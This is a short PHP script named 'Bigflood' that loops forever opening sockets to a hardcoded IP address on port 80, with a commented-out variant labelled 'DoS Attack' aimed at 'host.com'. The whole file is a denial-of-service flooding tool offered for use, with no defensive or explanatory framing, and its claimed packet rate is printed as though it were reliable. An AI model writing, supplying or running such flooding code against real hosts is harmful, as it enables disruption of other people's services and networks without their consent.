<?php
//Bigflood
$host = "localhost";
$host = "192.168.2.161";
$port = 80;
$timeout = 0.00001;

echo("Sending ".(1/$timeout)." packets / second.\n");
while(1) {
  @pfsockopen($host, $port, $errno, $err, $timeout);
}


/*

<?php
//DoS Attack
echo("Attacking...");
while(1) {
@pfsockopen(
"host.com", 80, $errno, $err, 0.00001);
}
?>

*/
